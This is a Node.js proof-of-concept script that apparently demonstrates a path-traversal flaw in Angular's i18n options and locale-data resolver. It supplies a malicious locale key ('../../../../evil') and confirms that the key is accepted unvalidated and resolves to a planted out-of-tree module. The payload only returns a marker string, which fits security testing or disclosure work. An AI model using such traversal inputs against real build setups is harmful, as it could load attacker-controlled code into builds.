import { createI18nOptions } from './i18n-options.bundle.mjs';
import { createRequire } from 'node:module';
import path from 'node:path';
import fs from 'node:fs';

const projectRoot = '/tmp/c1cd/project';
fs.mkdirSync(projectRoot, { recursive: true });
fs.writeFileSync('/tmp/c1cd/evil.js', "module.exports = { marker: 'EVIL-MODULE-9f3c1e' };\n");
fs.writeFileSync(projectRoot + '/package.json', '{"name":"fixture","private":true}\n');

// real shape: projectMetadata = { i18n: { sourceLocale, locales } }
const projectMetadata = {
  i18n: {
    sourceLocale: 'en',
    locales: {
      '../../../../evil': { translation: [] },   // attacker-controlled locale KEY (no explicit subPath)
      'fr': { translation: [] },
    },
  },
};
const i18n = createI18nOptions(projectMetadata, ['../../../../evil', 'fr'], { warn(){}, error(m){throw new Error(m);} }, false);
console.log('C1 inlineLocales:', [...i18n.inlineLocales]);
for (const [loc, desc] of Object.entries(i18n.locales)) {
  console.log('C1 locale:', JSON.stringify(loc), '-> subPath:', JSON.stringify(desc.subPath), '| dataPath:', JSON.stringify(desc.dataPath));
}
console.log('C1 PASS: malicious key accepted unvalidated, subPath = key:', i18n.locales['../../../../evil'].subPath === '../../../../evil');

// C2: the REAL resolver from i18n-webpack.ts L56-57 + findLocaleDataPath (L135-143) verbatim
const LOCALE_DATA_BASE_MODULE = '@angular/common/locales/global';
const projectRequire = createRequire(projectRoot + '/');
const localeResolver = (locale) => projectRequire.resolve(path.join(LOCALE_DATA_BASE_MODULE, locale));
function findLocaleDataPath(locale, resolver) {
  const scrubbedLocale = locale.replace(/-x(-[a-zA-Z0-9]{1,8})+$/, '');
  try { return resolver(scrubbedLocale); } catch { return scrubbedLocale === 'en-US' ? findLocaleDataPath('en', resolver) : null; }
}
try {
  const p = findLocaleDataPath('../../../../evil', localeResolver);
  const content = fs.readFileSync(p, 'utf8');
  console.log('C2 resolved:', p);
  console.log('C2 content has evil marker:', content.includes('EVIL-MODULE-9f3c1e'));
} catch (e) {
  console.log('C2 resolver threw:', e.message);
}
const c = findLocaleDataPath('fr', localeResolver);
console.log('C2 control fr ->', c, '| is evil file?', c === '/tmp/c1cd/evil.js');
